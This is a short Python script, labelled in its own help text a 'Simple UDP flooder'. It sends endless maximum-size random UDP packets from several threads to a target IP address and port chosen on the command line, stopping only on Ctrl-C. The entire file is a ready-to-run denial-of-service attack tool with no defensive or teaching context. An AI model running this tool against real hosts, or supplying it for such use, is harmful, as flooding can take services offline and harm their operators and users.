import argparse
import random
import socket
import threading
import time

EXITING = False
MAX_PAYLOAD_SIZE = 65507


def send_udp(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(MAX_PAYLOAD_SIZE)
    while not EXITING:
        s.sendto(payload, (host, port))
    s.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple UDP flooder")
    parser.add_argument("target", type=str, help="target IP-address")
    parser.add_argument("port", type=int, help="target port")
    parser.add_argument("--threads", type=int, help="number of threads")
    args = parser.parse_args()

    args, leftovers = parser.parse_known_args()

    threads = []
    n_threads = 4
    if args.threads is not None:
        n_threads = args.threads

    print(
        "Sending UDP flood to "
        + args.target
        + " on port "
        + str(args.port)
        + ".\n^C to stop."
    )
    for i in range(n_threads):
        thread = threading.Thread(target=send_udp, args=(args.target, args.port))
        thread.start()
        threads.append(thread)

    try:
        while threads:
            time.sleep(2)
    except KeyboardInterrupt:
        EXITING = True
        for thread in threads:
            thread.join()
            threads.remove(thread)
        print("Stopping ...")
